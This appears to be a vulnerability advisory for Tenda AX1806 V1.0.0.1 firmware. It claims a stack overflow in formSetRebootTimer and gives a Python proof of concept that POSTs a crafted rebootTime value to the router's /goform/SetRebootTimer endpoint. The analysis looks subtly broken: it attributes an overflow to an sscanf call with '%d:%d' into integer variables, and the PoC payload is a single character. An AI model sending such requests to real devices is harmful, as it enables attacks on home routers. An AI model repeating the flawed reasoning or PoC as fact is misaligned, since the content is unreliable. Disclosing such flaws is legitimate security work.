## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3422.html

## Affected version

AX1806 V1.0.0.1

## Vulnerability details

The Tenda AX1806 V1.0.0.1 firmware has a stack overflow vulnerability in the `formSetRebootTimer` function. The `v4` variable receives the `rebootTime` parameter from a POST request. However, since the user can control the input of `rebootTime`, the statement `v8 = _isoc99_sscanf(v4, "%d:%d", &v17, &v18);` can cause a buffer overflow. The user-provided `rebootTime` can exceed the capacity of the `v17, v18` array, triggering this security vulnerability.

![image-20240418171142325](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418171142325.png)

![image-20240418171133189](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418171133189.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetRebootTimer"
payload = "a"*1

data = {"rebootTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240415125733742](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415125733742.png)